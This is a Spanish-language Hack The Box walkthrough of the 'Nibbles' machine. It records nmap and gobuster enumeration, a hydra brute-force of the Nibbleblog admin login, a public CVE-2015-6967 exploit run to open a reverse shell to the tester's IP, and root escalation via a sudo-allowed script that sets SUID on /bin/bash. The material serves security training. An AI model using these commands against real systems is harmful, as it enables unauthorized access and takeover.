---
title: "Nibbles - WriteUp"
date: Fri Nov 01 2024 20:00:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, hydra, dirb, reverse-shell, cve, exploit, cve-2015-6967, apache]
image: /assets/img/htb-writeups/Pasted image 20240130110126.png
---

{% include machine-info.html
  machine="Nibbles"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Nibbles](/assets/img/htb-writeups/Pasted image 20240130110126.png)

---

---
----

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130110126.png)

----

NMAP

```bash
# Nmap 7.94SVN scan initiated Tue Jan 30 11:07:44 2024 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap
.xsl -oN targeted -oX targetedXML 10.129.4.29
Nmap scan report for 10.129.4.29
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 30 11:07:53 2024 -- 1 IP address (1 host up) scanned in 8.76 seconds
```

HTTP

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130111014.png)

Si examinamos el código fuente nos muestra una ruta oculta.

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130111117.png)

Vamos a ver qué contiene.

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130111421.png)

Si pulsamos en las categorías vemos esto en su URL

```http
URLs
http://10.129.4.29/nibbleblog/index.php?controller=blog&action=view&category=uncategorised
http://10.129.4.29/nibbleblog/index.php?controller=blog&action=view&category=music
http://10.129.4.29/nibbleblog/index.php?controller=blog&action=view&category=videos
```

FUZZING

```bash
$ gobuster dir -u http://10.129.4.29/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php
```

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130115328.png)

Encontramos varias rutas interesantes. 

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130115427.png)

Tenemos la versión. 

Panel de login.

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130123356.png)

Hacemos un diccionario de posibles contraseñas con _cewl_:

```bash
$ cewl -m 5 --lowercase -w ./passwords.txt http://10.129.4.29/nibbleblog
```

Lo hacemos del /README también e incluyendo mayúsculas pero después de varias pruebas este es el bueno.

```bash
$ hydra -l admin -P ./passwords.txt 10.129.4.29 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password."
```

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130122923.png)

Después de la fuerza bruta el servidor nos banea y no podemos probar todas las contraseñas por lo que reiniciamos el servidor.

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130123649.png)

##### NUEVA IP 10.129.4.38

Damos con la combinación ganadora:

```http
admin:nibbles
```

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130123902.png)

Encontramos este script para la explotación inicial y obtener la reverse shell:

```http
https://github.com/EchoSl0w/CVE/blob/main/2015/cve-2015-6967.py
```

Nos ponemos en escucha con _NetCat_ o en mi caso, haré uso de _penelope_:

Nos bajamos el exploit y lo ejecutamos de la siguiente manera:

```bash
$ python3 cve-2015-6967.py --url http://10.129.4.38/nibbleblog/ --ip 10.10.14.115 -u admin -p nibbles
```

![NIBBLES](/assets/img/htb-writeups/Pasted image 20240130125450.png)

#### ESCALADA

```bash
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Podemos ejecutar un script llamado _monitor.sh_

Pero no existe, por tanto lo crearemos en la misma ruta que apunta el script y creando las carpetas necesarias con el siguiente contenido:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Lo guardamos, le damos permisos de ejecución y lo ejecutamos:

```bash
$ sudo /home/nibbler/personal/stuff/monitor.sh
```

Ahora ejecutamos la bash con permisos privilegiados y escalamos a root:

```bash
nibbler@Nibbles:~$ /bin/bash -p
bash-4.3# whoami
root
```

Para mirar post explotación:
```
https://github.com/nirajmaharz/Hackthebox-nibbles-exploit

https://systemweakness.com/a-look-at-cve-2015-6967-fe9a990d57a1

https://github.com/EchoSl0w/CVE/blob/main/2015/cve-2015-6967.py
```
---

**Última actualización**: 2024-11-01<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
